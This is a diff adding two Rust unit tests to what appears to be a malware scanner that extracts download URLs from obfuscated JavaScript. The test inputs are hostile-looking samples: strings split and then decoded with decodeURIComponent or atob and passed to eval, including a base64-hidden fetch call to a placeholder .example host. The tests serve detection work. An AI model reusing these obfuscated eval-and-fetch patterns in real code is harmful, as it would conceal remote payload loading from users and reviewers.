@@ -9424,6 +9424,25 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_decodeuricomponent_concat_arg_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var p = "https%3A%2F%2Fdecode-concat-arg-js."; var q = "example%2Fp"; eval(decodeURIComponent(p + q))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-concat-arg-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent concat arg URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_unescape_malformed_percent_still_extracts_later_url() {
         let mut env = Environment::new(&Config::default());
         let js =
@@ -10027,6 +10046,30 @@ mod js_url_extraction_tests {
         assert!(
             has,
             "JS atob array index payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_concat_arg_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-concat-arg-js.example/p')",
+        );
+        let split = encoded.len() / 2;
+        let (left, right) = encoded.split_at(split);
+        let js = format!(r#"var p = "{left}"; var q = "{right}"; eval(atob(p + q))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-concat-arg-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob concat arg payload URL missed: {:?}",
             env.traits
         );
     }
